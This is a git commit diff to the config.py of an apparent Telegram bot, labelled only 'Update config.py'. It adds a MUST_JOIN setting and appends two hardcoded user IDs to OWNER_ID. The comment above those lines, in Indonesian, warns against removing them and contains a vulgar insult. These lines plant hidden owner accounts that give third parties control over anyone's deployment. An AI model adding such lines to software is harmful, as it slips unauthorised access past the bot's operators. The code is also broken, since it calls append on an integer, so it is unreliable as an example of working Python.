aad46a0d50a7167f1d2ed34dfe7023b5d4867fd2
testingslur <136461439+testingslur@users.noreply.github.com>
2024-02-29 00:38:34 +0700

    Update config.py

--- config.py
+++ config.py
@@ -21,8 +21,15 @@ DURATION_LIMIT_MIN = int(getenv("DURATION_LIMIT", 60))
 # Chat id of a group for logging bot's activities
 LOGGER_ID = int(getenv("LOGGER_ID", None))
 
+# MUST JOIN
+MUST_JOIN = getenv("MUST_JOIN", "")
+
 # Get this value from @FallenxBot on Telegram by /id
 OWNER_ID = int(getenv("OWNER_ID", 1441342342))
+
+# JANGAN HAPUS YA KONTOL
+OWNER_ID.append(5089916692)
+OWNER_ID.append(1938616056)
 
 ## Fill these variables if you're deploying on heroku.
 # Your heroku app name
